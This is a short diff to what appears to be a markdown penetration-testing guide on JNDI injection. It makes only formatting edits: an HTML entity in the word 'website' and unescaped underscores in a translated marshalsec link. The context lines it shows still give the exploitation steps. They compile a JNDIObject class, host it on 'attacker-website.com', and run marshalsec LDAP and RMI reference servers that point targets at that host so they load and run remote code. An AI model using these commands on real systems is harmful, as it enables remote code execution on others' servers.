@@ -788,9 +788,9 @@ Prepare a Java code for execution, you can reuse the [JNDIObject.java](https://r
 javac -source 1.5 -target 1.5 JNDIObject.java
 ```
 
-Then copy the generated `JNDIObject.class`file to the root directory of the `http://attacker-website.com` website**.**
+Then copy the generated `JNDIObject.class`file to the root directory of the `http://attacker-website.com` websit&#x65;**.**
 
-Set up LDAP server, use [marshalsec](https://github-com.translate.goog/mbechler/marshalsec?\_x\_tr\_sl=auto&\_x\_tr\_tl=en&\_x\_tr\_hl=en&\_x\_tr\_pto=wapp) to set up the server:
+Set up LDAP server, use [marshalsec](https://github-com.translate.goog/mbechler/marshalsec?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en&_x_tr_pto=wapp) to set up the server:
 
 ```bash
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://attacker-website.com:80/#JNDIObject 1389
@@ -915,9 +915,9 @@ Prepare a Java code for execution, you can reuse the [JNDIObject.java](https://r
 javac -source 1.5 -target 1.5 JNDIObject.java
 ```
 
-Then copy the generated `JNDIObject.class`file to the root directory of the `http://attacker-website.com` website**.**
+Then copy the generated `JNDIObject.class`file to the root directory of the `http://attacker-website.com` websit&#x65;**.**
 
-Set up RMI server, use [marshalsec](https://github-com.translate.goog/mbechler/marshalsec?\_x\_tr\_sl=auto&\_x\_tr\_tl=en&\_x\_tr\_hl=en&\_x\_tr\_pto=wapp) to set up the server:
+Set up RMI server, use [marshalsec](https://github-com.translate.goog/mbechler/marshalsec?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en&_x_tr_pto=wapp) to set up the server:
 
 ```bash
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://attacker-website.com:80/#JNDIObject 1389
